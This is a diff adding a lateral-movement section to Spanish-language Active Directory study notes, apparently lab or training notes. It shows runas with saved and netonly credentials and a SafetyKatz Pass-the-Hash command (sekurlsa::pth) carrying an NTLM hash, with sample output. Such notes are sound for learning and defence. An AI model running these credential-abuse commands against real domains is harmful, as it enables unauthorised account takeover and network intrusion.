@@ -6,6 +6,7 @@
 - [Enumeración](#Enumeración).
 - [*Logon Sesssion*](#LogonSession).
 - [*Token*](#Token).
+- [Movimiento lateral](#Moviliento_lateral).
 
 # Enumeración
 ### Listar usuarios locales:
@@ -57,4 +58,32 @@ Con ello el sistema operativo, aplica controles de acceso a través de privilegi
 
 ![Ex03](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/4.png)
 
+# Moviliento_latera
 
+## *runas*
+
+Con credenciales válidas, es posible crear un proceso actuando como ese usuario.
+- Aplica de manera local:
+```powershell
+runas.exe /user:ffff /savecred cmd.exe
+```
+- Aplica de manera remota:
+```powershell
+runas /noprofile /netonly /user:domain\Administrator powershell.exe
+```
+
+## *Pass-The-Hash*
+1. Se crea una nueva sesión.
+2. Se duplica el *token* original.
+3. Se referencia la nueva sesión.
+4. Se pueaplica al hilo principal o crear nuevo proceso y aplicarlo.
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /run:powershell.exe" "exit"
+```
+
+Al contar con los paquetes de autenticación *msv1_0* y *kerberos*, es posible acceder el consumo de los servicios a través de NTLM y Kerberos (si el servidor lo soporta).
+```powershell
+msv1_0   - data copy @ 0000013DED28C5E0 : OK !
+kerberos - data copy @ 0000013DECC9C6C8
+```
